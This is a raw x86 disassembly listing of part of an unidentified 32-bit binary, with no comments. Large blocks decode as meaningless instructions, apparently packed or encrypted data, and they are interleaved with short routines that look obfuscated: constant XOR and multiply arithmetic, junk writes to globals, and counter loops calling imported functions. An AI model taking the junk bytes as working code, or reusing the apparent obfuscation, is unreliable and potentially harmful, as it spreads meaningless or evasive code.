  404226:	mov    DWORD PTR [ecx+edi*8+0x5a36db38],edi
  40422d:	jbe    0x4042a6
  40422f:	(bad)  
  404230:	add    BYTE PTR [esi-0x80],ah
  404233:	ins    DWORD PTR es:[edi],dx
  404234:	icebp  
  404235:	les    ebx,FWORD PTR [ebx+0xc726128]
  40423b:	scas   eax,DWORD PTR es:[edi]
  40423c:	dec    ebx
  40423d:	(bad)  
  40423e:	ds cmp dh,bh
  404241:	push   esi
  404242:	adc    eax,0x6f576645
  404247:	xchg   ebp,eax
  404248:	mov    cl,0x29
  40424a:	nop
  40424b:	and    al,0x45
  40424d:	add    esp,DWORD PTR [eax+ebp*2]
  404250:	mov    edx,0xcf201735
  404255:	out    dx,eax
  404256:	int    0xb9
  404258:	in     al,dx
  404259:	enter  0xbc24,0x52
  40425d:	mov    dh,0x2c
  40425f:	outs   dx,DWORD PTR ds:[esi]
  404260:	ins    BYTE PTR es:[edi],dx
  404261:	adc    DWORD PTR [edi],edi
  404263:	jmp    0xa32b:0x81db02c4
  40426a:	add    ah,BYTE PTR [ebx+ebp*1]
  40426d:	adc    al,0xe
  40426f:	js     0x4042f0
  404271:	adc    BYTE PTR [esi-0x47],al
  404274:	mov    ch,0x39
  404276:	pop    ecx
  404277:	call   0x6847:0x68d6e2e
  40427e:	outs   dx,BYTE PTR ds:[esi]
  40427f:	int    0xa
  404281:	push   esi
  404282:	sahf   
  404283:	retf   
  404284:	stos   DWORD PTR es:[edi],eax
  404285:	arpl   WORD PTR [ecx+0x2f],dx
  404288:	dec    ebp
  404289:	inc    ecx
  40428a:	and    dl,ah
  40428c:	mov    ecx,0xb31afdda
  404291:	cmp    dl,BYTE PTR [ecx+0x20]
  404294:	das    
  404295:	jmp    0x87af:0xc705a21a
  40429c:	fst    DWORD PTR [edx]
  40429e:	cmp    DWORD PTR [ecx-0x2558dcf8],0xc7973767
  4042a8:	(bad)  
  4042a9:	retf   0x5771
  4042ac:	dec    edi
  4042ad:	lea    ebx,[edi-0x2]
  4042b0:	out    dx,eax
  4042b1:	(bad)  
  4042b2:	repnz and al,0x4e
  4042b5:	mov    bl,0xac
  4042b7:	sub    eax,0x527db4f9
  4042bc:	xor    ecx,edx
  4042be:	retf   0x79dc
  4042c1:	xchg   edx,eax
  4042c2:	xchg   DWORD PTR [esi],edx
  4042c4:	mov    ecx,0xc3f04389
  4042c9:	jns    0x40425f
  4042cb:	sub    al,0x9
  4042cd:	add    al,0x30
  4042cf:	xchg   ebx,eax
  4042d0:	ins    BYTE PTR es:[edi],dx
  4042d1:	jbe    0x40426f
  4042d3:	xchg   BYTE PTR [eax-0x21],ah
  4042d6:	push   ds
  4042d7:	sub    al,0x12
  4042d9:	mov    ch,0x4c
  4042db:	mov    al,ds:0xb5d47737
  4042e0:	ja     0x4042b7
  4042e2:	sub    ah,BYTE PTR [edx-0x40]
  4042e5:	pop    es
  4042e6:	or     eax,0xaf71a8a9
  4042eb:	mov    dl,0xd1
  4042ed:	mov    ebx,0x5ea79d41
  4042f2:	dec    ebx
  4042f3:	add    BYTE PTR [ecx],cl
  4042f5:	dec    esp
  4042f6:	imul   edi,DWORD PTR [edx-0x27c345c2],0x60
  4042fd:	aam    0x8d
  4042ff:	int3   
  404300:	adc    BYTE PTR [eax],0xba
  404303:	pop    esi
  404304:	std    
  404305:	pop    esp
  404306:	loop   0x404319
  404308:	cli    
  404309:	es leave 
  40430b:	adc    al,BYTE PTR [edx-0x5b]
  40430e:	popf   
  40430f:	inc    BYTE PTR [edx+0x60fe65ab]
  404315:	xchg   ebp,eax
  404316:	xchg   BYTE PTR [esi-0x55059ff7],dh
  40431c:	inc    esi
  40431d:	das    
  40431e:	push   ebx
  40431f:	cmp    ah,BYTE PTR [edx]
  404321:	into   
  404322:	call   0xb7d7:0xeb2f906b
  404329:	jl     0x4043a3
  40432b:	xchg   ebx,eax
  40432c:	jmp    0x404393
  40432e:	sar    BYTE PTR [eax],cl
  404330:	icebp  
  404331:	jecxz  0x404327
  404333:	push   edi
  404334:	or     eax,0x73be5f59
  404339:	cmp    DWORD PTR [ebx+eiz*1],eax
  40433c:	push   esp
  40433d:	push   ds
  40433e:	push   ebx
  40433f:	cs js  0x4042d0
  404342:	lea    ecx,[ecx]
  404344:	sub    BYTE PTR [ecx-0x3d],dl
  404347:	xor    eax,0x43f6855d
  40434c:	shl    DWORD PTR [ebp+0x6],1
  40434f:	(bad)  
  404351:	pop    DWORD PTR [ebx+0x86ec9b3]
  404357:	js     0x40430d
  404359:	in     eax,dx
  40435a:	int3   
  40435b:	lods   eax,DWORD PTR ds:[esi]
  40435c:	cwde   
  40435d:	call   eax
  40435f:	mov    ebp,0x21d7108c
  404364:	into   
  404365:	ins    BYTE PTR es:[edi],dx
  404366:	adc    al,dh
  404368:	icebp  
  404369:	mov    dh,0x16
  40436b:	adc    ebx,esp
  40436d:	xor    eax,0x818c7950
  404372:	dec    ebp
  404373:	mov    al,ds:0xc8db035f
  404378:	div    BYTE PTR [eax-0x2e]
  40437b:	hlt    
  40437c:	in     al,dx
  40437d:	mov    WORD PTR [ecx+0x429e80f3],ss
  404383:	(bad)  
  404384:	push   edx
  404385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404386:	(bad)
  40438a:	cld    
  40438b:	xor    al,BYTE PTR [ebp+0x458bf89c]
  404391:	cld    
  404392:	push   esi
  404393:	or     DWORD PTR ds:0x42edef,0x42e7c0
  40439d:	mov    esi,DWORD PTR [ebp-0x8]
  4043a0:	and    DWORD PTR ds:0x42ede7,edi
  4043a6:	mov    edx,0x7510854
  4043ab:	or     DWORD PTR ds:0x430435,0x1aa0
  4043b5:	xor    eax,edx
  4043b7:	add    DWORD PTR ds:0x42edef,0x430435
  4043c1:	xor    esi,edx
  4043c3:	mov    ecx,0x32729b
  4043c8:	or     DWORD PTR ds:0x4304df,0x42e7c8
  4043d2:	add    esi,ecx
  4043d4:	add    eax,ecx
  4043d6:	sub    DWORD PTR ds:0x42e7cc,0x70e
  4043e0:	imul   eax,esi
  4043e3:	mov    esi,0x43d2
  4043e8:	mov    esi,DWORD PTR [ebp+0xc]
  4043eb:	cmp    esi,eax
  4043ed:	jne    0x4045f5
  4043f3:	mov    eax,DWORD PTR [ebp-0x4]
  4043f6:	mov    esi,DWORD PTR [ebp-0x8]
  4043f9:	xor    DWORD PTR ds:0x42ede3,0x42edeb
  404403:	xor    eax,edx
  404405:	and    DWORD PTR ds:0x42edeb,0x3e0c
  40440f:	xor    esi,edx
  404411:	xor    DWORD PTR ds:0x43044d,0x798f
  40441b:	jmp    0x4045df
  404420:	jbe    0x40448b
  404422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404423:	adc    eax,0x6974d1a1
  404428:	sahf   
  404429:	es push 0x79
  40442c:	xor    BYTE PTR ds:0x19fd7747,al
  404432:	jle    0x4044b2
  404434:	cdq    
  404435:	jg     0x4044b5
  404437:	jle    0x404465
  404439:	sub    ecx,DWORD PTR [eax]
  40443b:	mov    ah,0xef
  40443d:	scas   eax,DWORD PTR es:[edi]
  40443e:	adc    al,0x19
  404440:	push   eax
  404441:	mov    edx,DWORD PTR [ebp-0x71]
  404444:	push   0x32
  404446:	outs   dx,DWORD PTR ds:[esi]
  404447:	jg     0x404439
  404449:	pop    esp
  40444a:	inc    esi
  40444b:	jg     0x4043e1
  40444d:	lods   al,BYTE PTR ds:[esi]
  40444e:	sbb    ecx,ecx
  404450:	push   esp
  404451:	push   ebp
  404452:	push   edi
  404453:	mov    ch,0xd1
  404455:	aaa    
  404456:	dec    eax
  404457:	or     DWORD PTR [ecx+0x2f],ebp
  40445a:	xor    BYTE PTR [ecx],ch
  40445c:	cmp    al,BYTE PTR [ebx-0x21c6e835]
  404462:	xlat   BYTE PTR fs:[ebx]
  404464:	xor    al,0x31
  404466:	bound  esp,QWORD PTR [eax]
  404468:	(bad)  
  404469:	(bad)  
  40446a:	(bad)  
  40446c:	jo     0x40446c
  40446e:	dec    edi
  40446f:	aaa    
  404470:	cmp    eax,0xbd4b5734
  404475:	fidiv  DWORD PTR [eax+0x3d81be3e]
  40447b:	in     eax,0xb6
  40447d:	fcomip st,st(4)
  40447f:	fld    QWORD PTR [eax-0x465b335]
  404485:	mov    bl,0x2c
  404487:	mov    ch,0xfe
  404489:	xlat   BYTE PTR ds:[ebx]
  40448a:	xor    eax,0x17d5e696
  40448f:	jbe    0x4044e0
  404491:	pop    edi
  404492:	mul    BYTE PTR [ebp-0x77818e77]
  404498:	jne    0x404500
  40449a:	sbb    al,bh
  40449c:	pop    edx
  40449d:	scas   eax,DWORD PTR es:[edi]
  40449e:	test   eax,0x3c7c69c8
  4044a3:	cmp    BYTE PTR [edx-0x7fafb1d9],dl
  4044a9:	cvtps2pd xmm3,xmm5
  4044ac:	fwait
  4044ad:	jae    0x4044df
  4044af:	ror    DWORD PTR [edx+edx*8+0xfc77781],0xcf
  4044b7:	fmul   st(2),st
  4044b9:	ja     0x404532
  4044bb:	push   cs
  4044bc:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044be:	sbb    DWORD PTR [esi+0x5b5b48a9],edi
  4044c4:	inc    eax
  4044c5:	fadd   st(2),st
  4044c7:	test   DWORD PTR [edx],ecx
  4044c9:	daa    
  4044ca:	jl     0x4044d1
  4044cc:	imul   BYTE PTR [esi+0x5f7a45e8]
  4044d2:	or     edx,DWORD PTR [edi]
  4044d4:	(bad)  
  4044d5:	pushf  
  4044d6:	mov    bl,0x80
  4044d8:	jno    0x404500
  4044da:	lds    esp,FWORD PTR [eax+0xe752541]
  4044e0:	test   al,0x91
  4044e2:	xor    esi,DWORD PTR [esi-0x1e87e4de]
  4044e8:	stos   BYTE PTR es:[edi],al
  4044e9:	repnz add eax,0x1b989dcb
  4044ef:	mov    eax,ds:0xe57da85f
  4044f4:	lods   al,BYTE PTR ds:[esi]
  4044f5:	mov    ds:0xd6405451,al
  4044fa:	cmp    ch,bh
  4044fc:	cld    
  4044fd:	adc    al,0x47
  4044ff:	adc    ebp,DWORD PTR [ebx+0x4cf081c]
  404505:	lods   eax,DWORD PTR ds:[esi]
  404506:	mov    esi,0x271f690b
  40450b:	lods   al,BYTE PTR ds:[esi]
  40450c:	stos   BYTE PTR es:[edi],al
  40450d:	out    0xc9,eax
  40450f:	repz mov dh,0xd0
  404512:	in     eax,dx
  404513:	push   ebx
  404514:	sub    edx,DWORD PTR [eax+esi*4]
  404517:	dec    edx
  404518:	dec    edx
  404519:	jmp    0x4044f4
  40451b:	dec    esi
  40451c:	inc    esi
  40451d:	mov    cl,0xf
  40451f:	(bad)
  404523:	adc    ecx,edi
  404525:	call   0x5beb12e1
  40452a:	pop    ebx
  40452b:	pushf  
  40452c:	jae    0x404536
  40452e:	adc    eax,0xed5defbf
  404533:	fiadd  DWORD PTR [ecx-0x67491620]
  404539:	loope  0x404598
  40453b:	adc    DWORD PTR [esp+esi*1-0x25],esp
  40453f:	int    0xd7
  404541:	mov    ebp,0x6cafcb71
  404546:	xchg   edx,eax
  404547:	add    ebx,0x94edbebd
  40454d:	push   esp
  40454e:	cmc    
  40454f:	jae    0x40458c
  404551:	lds    esi,FWORD PTR [eax-0x4a1401e2]
  404557:	ds dec ebx
  404559:	xchg   edi,eax
  40455a:	add    al,0x71
  40455c:	inc    esi
  40455d:	push   edi
  40455e:	sub    eax,ebp
  404560:	or     DWORD PTR [ebp+ecx*8-0x57],ecx
  404564:	xchg   ebx,eax
  404565:	test   al,0xe1
  404567:	add    BYTE PTR [ebx+0x61f5eec3],ch
  40456d:	xchg   esi,eax
  40456e:	mov    ds:0x2e05ef98,ax
  404574:	(bad)  
  404575:	push   eax
  404576:	stc    
  404577:	pop    es
  404578:	push   ecx
  404579:	fiadd  DWORD PTR [eax+edx*2-0x29]
  40457d:	loopne 0x40457c
  40457f:	fcom   QWORD PTR [ebx-0x5e]
  404582:	jnp    0x4045a1
  404584:	test   DWORD PTR [esi],esp
  404586:	mov    edi,DWORD PTR [edx+0x7baaa22f]
  40458c:	xor    eax,0xd2f28f05
  404591:	call   0x5d25:0x42e2f8ab
  404598:	jge    0x40451d
  40459a:	mul    DWORD PTR [ecx-0x6cf69066]
  4045a0:	popf   
  4045a1:	adc    edx,ecx
  4045a3:	dec    esp
  4045a4:	cmp    al,0x40
  4045a6:	mov    ?,WORD PTR [eax]
  4045a8:	(bad)  
  4045a9:	lods   eax,DWORD PTR ds:[esi]
  4045aa:	stos   DWORD PTR es:[edi],eax
  4045ab:	push   ss
  4045ac:	in     al,dx
  4045ad:	jl     0x4045e7
  4045af:	and    esp,eax
  4045b1:	imul   ebx,DWORD PTR [ebx+esi*1-0x3a50fad5],0xaca70533
  4045bc:	pushf  
  4045bd:	pop    edx
  4045be:	add    ebp,DWORD PTR [esi+0x76bc5ab]
  4045c4:	fsub   st(7),st
  4045c6:	sub    BYTE PTR [ecx+0x510d67f],ch
  4045cc:	aam    0x7
  4045ce:	lea    esi,[ebp-0x41]
  4045d1:	mov    edx,0x588ed1e8
  4045d6:	jbe    0x4045db
  4045d8:	fst    QWORD PTR [edi+0x38]
  4045db:	(bad)  
  4045dc:	pop    edx
  4045dd:	addr16 dec esi
  4045df:	add    eax,ecx
  4045e1:	add    esi,ecx
  4045e3:	imul   eax,esi
  4045e6:	mov    DWORD PTR ds:0x4304e7,0x2c81
  4045f0:	jmp    0x4046a8
  4045f5:	and    DWORD PTR ds:0x430439,0x0
  4045ff:	jmp    0x404612
  404604:	xor    eax,eax
  404606:	xor    eax,DWORD PTR ds:0x430439
  40460c:	inc    eax
  40460d:	mov    ds:0x430439,eax
  404612:	cmp    DWORD PTR ds:0x430439,0x18
  404619:	jae    0x40466d
  40461f:	cmp    DWORD PTR ds:0x430439,0xd
  404626:	jne    0x404650
  40462c:	push   0x4871
  404631:	push   0x7618
  404636:	push   0x847f
  40463b:	push   DWORD PTR [ebp-0x1c]
  40463e:	push   DWORD PTR [ebp-0xc]
  404641:	push   DWORD PTR [ebp-0x14]
  404644:	push   DWORD PTR [ebp-0x10]
  404647:	push   DWORD PTR [ebp-0x10]
  40464a:	call   DWORD PTR ds:0x42ec13
  404650:	cmp    DWORD PTR ds:0x430439,0xc
  404657:	jne    0x404668
  40465d:	mov    eax,ds:0x430439
  404662:	inc    eax
  404663:	mov    ds:0x430439,eax
  404668:	jmp    0x404604
  40466d:	mov    eax,DWORD PTR [ebp+0xc]
  404670:	mov    eax,DWORD PTR [eax+0x78]
  404673:	mov    DWORD PTR [ebp+0xc],eax
  404676:	mov    eax,DWORD PTR [ebp-0x4]
  404679:	mov    esi,DWORD PTR [ebp-0x8]
  40467c:	xor    eax,edx
  40467e:	xor    esi,edx
  404680:	add    eax,ecx
  404682:	add    esi,ecx
  404684:	imul   eax,esi
  404687:	mov    esi,DWORD PTR [ebp+0xc]
  40468a:	cmp    esi,eax
  40468c:	mov    eax,DWORD PTR [ebp-0x4]
  40468f:	je     0x4043f6
  404695:	xor    eax,edx
  404697:	add    eax,ecx
  404699:	mov    ecx,DWORD PTR [ebp+0xc]
  40469c:	imul   eax,ecx
  40469f:	add    eax,DWORD PTR [ebp+0x8]
  4046a2:	mov    DWORD PTR [ebp+0xc],eax
  4046a5:	mov    eax,DWORD PTR [ebp+0xc]
  4046a8:	pop    esi
  4046a9:	leave  
  4046aa:	ret    0x8
  4046ad:	push   ebp
  4046ae:	mov    ebp,esp
  4046b0:	push   ecx
  4046b1:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4046b8:	mov    DWORD PTR ds:0x42edd3,0x122d
  4046c2:	mov    eax,DWORD PTR [ebp-0x4]
  4046c5:	mov    edx,DWORD PTR [ebp+0x10]
  4046c8:	mov    ecx,0x7510854
  4046cd:	sbb    DWORD PTR ds:0x430439,0x430471
  4046d7:	xor    eax,ecx
  4046d9:	sub    DWORD PTR ds:0x43045d,0x42eddb
  4046e3:	add    eax,0x32729b
  4046e8:	jmp    0x4049a4
  4046ed:	fnstenv [eax+0x4]
  4046f0:	loop   0x404687
  4046f2:	jb     0x4046cd
  4046f4:	jno    0x40470f
  4046f6:	in     eax,0x6e
  4046f8:	jne    0x404754
  4046fa:	stos   DWORD PTR es:[edi],eax
  4046fb:	sbb    eax,ecx
  4046fd:	and    al,0x27
  4046ff:	jle    0x40477f
  404701:	xchg   ecx,eax
  404702:	jl     0x404782
  404704:	jle    0x40476f
  404706:	icebp  
  404707:	or     ah,BYTE PTR [edx+0x672b1cfb]
  40470d:	xchg   ebp,eax
  40470e:	sbb    al,0xd7
  404710:	cmp    cl,BYTE PTR [ebx-0x1]
  404713:	div    edx
  404715:	pop    ss
  404716:	sti    
  404717:	inc    edx
  404718:	test   DWORD PTR [esi-0x5c],ecx
  40471b:	sbb    eax,0x4f95aec1
  404720:	mov    edi,ds
  404722:	pop    edx
  404723:	pop    es
  404724:	push   ecx
  404725:	in     eax,0x37
  404727:	xor    edx,DWORD PTR [ebx]
  404729:	xchg   esp,eax
  40472a:	(bad)  
  40472b:	fiadd  DWORD PTR [edx-0x6d]
  40472e:	push   cs
  40472f:	mov    ecx,0x679bd1de
  404734:	popf   
  404735:	cmp    eax,0xf25823d1
  40473a:	imul   esp,DWORD PTR [eax+edx*8+0x34eae9d3],0xbfdd1a6e
  404745:	stos   DWORD PTR es:[edi],eax
  404746:	enter  0xbb30,0x60
  40474a:	fs pop esp
  40474c:	test   al,0x27
  40474e:	and    bl,BYTE PTR [eax+0x566e8387]
  404754:	call   0x36a3d8c
  404759:	jns    0x404793
  40475b:	dec    ebx
  40475c:	aam    0xac
  40475e:	retf   
  40475f:	sbb    BYTE PTR [esi],dl
  404761:	or     BYTE PTR [ebp+0x5e1f599e],dh
  404767:	stc    
  404768:	scas   al,BYTE PTR es:[edi]
  404769:	sub    eax,0x5a825ff4
  40476e:	mov    ah,0x96
  404770:	cmp    eax,0x5ac83f2e
  404775:	ret    0x79c0
  404778:	sbb    DWORD PTR [esi+ebp*2+0x62],0x6d
  40477d:	sbb    eax,0x391f1a44
  404782:	push   ebx
  404783:	rcr    DWORD PTR [edx-0x54],0xa1
  404787:	clc    
  404788:	(bad)  
  404789:	xlat   BYTE PTR ds:[ebx]
  40478a:	outs   dx,BYTE PTR ds:[esi]
  40478b:	inc    edi
  40478c:	adc    BYTE PTR [ebx+0x7b],dh
  40478f:	mov    esi,0x41a3d468
  404794:	neg    DWORD PTR [eax]
  404796:	ss xor ch,ch
  404799:	je     0x985651ca
  40479f:	mov    ebp,0x7d5d2b19
  4047a4:	fild   DWORD PTR [edi]
  4047a6:	pop    ebx
  4047a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047a8:	icebp  
  4047a9:	es into 
  4047ab:	test   DWORD PTR [ebx+0x5f],0x18c81b12
  4047b2:	retf   0x60f6
  4047b5:	push   ebx
  4047b6:	jae    0x40473b
  4047b8:	retf   0xa722
  4047bb:	js     0x404750
  4047bd:	mov    dl,0xb1
  4047bf:	adc    al,0xa
  4047c1:	sti    
  4047c2:	sbb    DWORD PTR [eax-0x43],ecx
  4047c5:	ins    DWORD PTR es:[edi],dx
  4047c6:	mov    dl,0xdb
  4047c8:	sbb    BYTE PTR [ebx],ah
  4047ca:	clc    
  4047cb:	push   edx
  4047cc:	mov    dh,0x35
  4047ce:	shl    DWORD PTR [eax],0x45
  4047d1:	or     ebp,DWORD PTR [ebp+0x285a7eee]
  4047d7:	xchg   ebp,eax
  4047d8:	sbb    al,0xb9
  4047da:	inc    esi
  4047db:	scas   al,BYTE PTR es:[edi]
  4047dc:	xchg   ebx,eax
  4047dd:	mov    ebx,DWORD PTR [edi]
  4047df:	and    BYTE PTR [ebp-0xb],bh
  4047e2:	das    
  4047e3:	(bad)  
  4047e4:	cmp    eax,0x47eeb7fc
  4047e9:	icebp  
  4047ea:	add    eax,0x96443b90
  4047ef:	popa   
  4047f0:	or     al,0x44
  4047f2:	mov    ds:0x15e25095,eax
  4047f7:	mov    WORD PTR [ecx-0x69],?
  4047fa:	xor    bh,ah
  4047fc:	ja     0x404841
  4047fe:	push   esi
  4047ff:	add    al,0x97
  404802:	stos   BYTE PTR es:[edi],al
  404803:	mov    dh,0xe9
  404805:	mov    edx,0x4e47d38c
  40480a:	adc    esi,DWORD PTR ds:0x3edb6375
  404810:	sbb    eax,0x8f12de34
  404815:	and    DWORD PTR [esi-0x5536001e],esp
  40481b:	jno    0x40486e
  40481d:	jl     0x404856
  40481f:	sbb    BYTE PTR [edi+0x49],0x1e
  404823:	dec    esp
  404824:	dec    ebp
  404825:	xor    BYTE PTR [edx],bl
  404827:	addr16 and eax,0xf24e8e15
  40482d:	inc    edx
  40482e:	inc    ebx
  40482f:	cmp    DWORD PTR [edx],edx
  404831:	xchg   ebx,eax
  404832:	mov    edi,0xb92f55a6
  404837:	into   
  404838:	leave  
  404839:	mov    esp,0xbd789be4
  40483e:	mov    ds:0xa4c22ced,al
  404843:	pop    ebx
  404844:	fs xchg ebx,eax
  404846:	retf   
  404847:	fs popa 
  404849:	add    eax,0x4473d337
  40484e:	(bad)  
  40484f:	cmp    edx,DWORD PTR [esi]
  404851:	hlt    
  404852:	xlat   BYTE PTR ds:[ebx]
  404853:	push   ds
  404854:	test   DWORD PTR [eax],esp
  404856:	cmc    
  404857:	shr    BYTE PTR [eax+0x7490f13c],0x2e
  40485e:	xchg   ecx,eax
  40485f:	jge    0x404877
  404861:	stos   DWORD PTR es:[edi],eax
  404862:	pop    es
  404863:	test   DWORD PTR [ecx+0x23],ebx
  404866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404867:	loope  0x404804
  404869:	enter  0x9c1a,0x55
  40486d:	cmp    al,BYTE PTR [eax+ebx*2+0x61]
  404871:	shl    BYTE PTR [ecx],0xc6
  404874:	lea    ebx,[edi+ebp*8]
  404877:	sub    ah,BYTE PTR [eax-0x1403d1e1]
  40487d:	std    
  40487e:	push   esp
  40487f:	mov    WORD PTR [edi+0x72b951b9],es
  404885:	fisttp QWORD PTR [edx+ecx*4+0x37]
  404889:	das    
  40488a:	inc    ebx
  40488b:	sbb    BYTE PTR [esi-0x4bf2a2e0],0xf4
  404892:	std    
  404893:	fcom   DWORD PTR [esi-0x1]
  404896:	(bad)  [eax+0x9]
  404899:	and    BYTE PTR [ecx],cl
  40489b:	jbe    0x40489f
  40489d:	push   0xffffffa7
  40489f:	ins    DWORD PTR es:[edi],dx
  4048a0:	retf   0x137d
  4048a3:	rcr    BYTE PTR [esi],cl
  4048a5:	popa   
  4048a6:	xchg   edi,eax
  4048a7:	shl    DWORD PTR [esi+0x23],0x3e
  4048ab:	out    0x24,eax
  4048ad:	aas    
  4048ae:	push   ecx
  4048af:	mov    ecx,0xaa1cfc2f
  4048b4:	std    
  4048b5:	cmp    al,0xdb
  4048b7:	xor    esp,DWORD PTR cs:[edx+0xd17c661]
  4048be:	sbb    cl,BYTE PTR [ebx]
  4048c0:	push   0x695cd973
  4048c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048c6:	cli    
  4048c7:	popa   
  4048c8:	stos   BYTE PTR es:[edi],al
  4048c9:	cmp    al,0x9
  4048cb:	cli    
  4048cc:	xchg   ebx,eax
  4048cd:	mov    bl,0xbe
  4048cf:	inc    esi
  4048d0:	jecxz  0x4048ac
  4048d2:	mov    es,WORD PTR [eax-0x7e279328]
  4048d8:	xchg   BYTE PTR [ecx-0x9],dh
  4048db:	xchg   edx,eax
  4048dc:	xor    DWORD PTR [ecx],0xffffff87
  4048df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048e0:	sub    al,BYTE PTR [ebx+ebp*1+0x6b4d8b10]
  4048e7:	call   0x359e:0x2e7e67be
  4048ee:	mov    edx,0xe722f82a
  4048f3:	jo     0x404885
  4048f5:	call   0x96d9:0x5aac0a45
  4048fc:	fs jns 0x4048a5
  4048ff:	stos   BYTE PTR es:[edi],al
  404900:	and    eax,0x5d33ba24
  404905:	std    
  404906:	les    eax,FWORD PTR [esi+0x35a9b4ca]
  40490c:	xor    eax,0x7371b55f
  404911:	fs mov ebx,0x4c466b4c
  404917:	mov    DWORD PTR [ecx+edi*4+0x3839f182],eax
  40491e:	jge    0x4048cf
  404920:	jns    0x40492f
  404922:	mov    dl,0x42
  404924:	add    ecx,DWORD PTR [edx+ecx*8+0x642b1c4]
  40492b:	ss loope 0x40494a
  40492e:	jp     0x40494b
  404930:	repnz ficomp WORD PTR [ecx]
  404933:	pop    edx
  404934:	inc    edi
  404935:	dec    esp
  404936:	lahf   
  404937:	hlt    
  404938:	push   ss
  404939:	fdivr  DWORD PTR [edi+0x7c]
  40493c:	lds    edi,FWORD PTR [eax+ebp*4+0x64652317]
  404943:	lock daa 
  404945:	mov    eax,0x385eb3a4
  40494a:	outs   dx,BYTE PTR ds:[esi]
  40494b:	and    eax,edi
  40494d:	jnp    0x404953
  40494f:	mov    al,0x86
  404951:	retf   0xc256
  404954:	lahf   
  404955:	hlt    
  404956:	inc    ebp
  404957:	fdiv   st,st(5)
  404959:	pop    ss
  40495a:	sub    ebx,DWORD PTR [edx-0x60]
  40495d:	test   eax,0x816247b1
  404962:	and    DWORD PTR [edx],edi
  404964:	cdq    
  404965:	pop    es
  404966:	addr16 pushf 
  404968:	inc    esp
  404969:	sub    eax,0x6735fd74
  40496e:	sbb    DWORD PTR cs:[edx-0x3d],0x47d79154
  404976:	xchg   DWORD PTR [edi-0x9],edx
  404979:	das    
  40497a:	lahf   
  40497b:	ja     0x40491e
  40497d:	cld    
  40497e:	hlt    
  40497f:	push   esi
  404980:	mov    fs,eax
  404982:	inc    edi
  404983:	rcl    ch,0x9
  404986:	je     0x404a03
  404988:	stos   BYTE PTR es:[edi],al
  404989:	inc    esp
  40498a:	(bad)  
  40498b:	mov    dh,0x97
  40498d:	jno    0x404924
  40498f:	lock mov eax,fs
  404992:	push   cs
  404993:	jmp    0xa8ccf21b
  404998:	pop    ebp
  404999:	cmp    BYTE PTR [esp+ebx*8-0x1bce5eb1],0x25
  4049a1:	(bad)  
  4049a2:	test   al,0x9b
  4049a4:	mov    DWORD PTR [edx],eax
  4049a6:	and    DWORD PTR ds:0x42e7d8,0x0
  4049b0:	xor    edx,edx
  4049b2:	xor    edx,DWORD PTR ds:0x42e7d8
  4049b8:	inc    edx
  4049b9:	mov    DWORD PTR ds:0x42e7d8,edx
  4049bf:	cmp    DWORD PTR ds:0x42e7d8,0xd
  4049c6:	jne    0x4049da
  4049cc:	push   0x1
  4049ce:	push   DWORD PTR [ebp-0x18]
  4049d1:	push   DWORD PTR [ebp-0xc]
  4049d4:	call   DWORD PTR ds:0x42e9cf
  4049da:	cmp    DWORD PTR ds:0x42e7d8,0xc
  4049e1:	jne    0x4049f4
  4049e7:	mov    edx,DWORD PTR ds:0x42e7d8
  4049ed:	inc    edx
  4049ee:	mov    DWORD PTR ds:0x42e7d8,edx
  4049f4:	cmp    DWORD PTR ds:0x42e7d8,0x1c
  4049fb:	jb     0x4049b0
  404a01:	sub    DWORD PTR ds:0x42edeb,ebx
  404a07:	mov    eax,DWORD PTR [ebp+0xc]
  404a0a:	xor    eax,ecx
  404a0c:	xor    DWORD PTR ds:0x4304cf,ecx
  404a12:	push   esi
  404a13:	mov    esi,DWORD PTR [ebp+0x10]
  404a16:	add    DWORD PTR ds:0x42ede7,0x6bf6
  404a20:	mov    edx,0x32729b
  404a25:	sbb    DWORD PTR ds:0x4304e3,0x4304df
  404a2f:	add    eax,edx
  404a31:	add    DWORD PTR ds:0x42ede7,0x26eb
  404a3b:	mov    DWORD PTR [esi+0x4],eax
  404a3e:	adc    eax,DWORD PTR ds:0x4304db
  404a44:	mov    eax,DWORD PTR [ebp+0x14]
  404a47:	mov    esi,DWORD PTR [ebp+0x10]
  404a4a:	mov    DWORD PTR [esi+0x8],eax
  404a4d:	mov    eax,DWORD PTR [ebp+0x18]
  404a50:	mov    esi,DWORD PTR [ebp+0x10]
  404a53:	mov    DWORD PTR [esi+0xc],eax
  404a56:	mov    eax,DWORD PTR [ebp+0x1c]
  404a59:	mov    esi,DWORD PTR [ebp+0x10]
  404a5c:	mov    DWORD PTR [esi+0x10],eax
  404a5f:	mov    eax,eax
  404a61:	mov    eax,DWORD PTR [ebp+0x8]
  404a64:	xor    eax,ecx
  404a66:	add    eax,edx
  404a68:	pop    esi
  404a69:	leave  
  404a6a:	ret    0x18
  404a6d:	push   ebp
  404a6e:	mov    ebp,esp
  404a70:	mov    eax,DWORD PTR [ebp+0xc]
  404a73:	xor    edx,edx
  404a75:	mov    ecx,0x7264fca9
  404a7a:	jmp    0x404d36
  404a7f:	xor    dh,BYTE PTR ss:[edi]
  404a82:	loope  0x404ab7
  404a84:	loope  0x404a76
  404a86:	icebp  
  404a87:	pop    es
  404a88:	mov    DWORD PTR [ebp+0x79],ecx
  404a8b:	push   es
  404a8c:	test   DWORD PTR [edi+0x7],eax
  404a8f:	inc    edi
  404a90:	and    eax,0x7c917e7e
  404a95:	jle    0x404b15
  404a97:	mov    ah,0xe3
  404a99:	inc    ebp
  404a9a:	jns    0x404a67
  404a9c:	stos   DWORD PTR es:[edi],eax
  404a9d:	(bad)  
  404a9e:	int3   
  404a9f:	xor    al,0xd0
  404aa1:	call   0xa4c4:0x95d41c66
  404aa8:	pop    esp
  404aa9:	sbb    edx,ecx
  404aab:	ins    DWORD PTR es:[edi],dx
  404aac:	xchg   esp,eax
  404aad:	je     0x404b05
  404aaf:	daa    
  404ab0:	cmp    DWORD PTR [ebp+ebx*4+0x5],ecx
  404ab4:	jo     0x404a71
  404ab6:	sbb    DWORD PTR [edx],0x42
  404ab9:	jle    0x404ad7
  404abb:	or     al,0x13
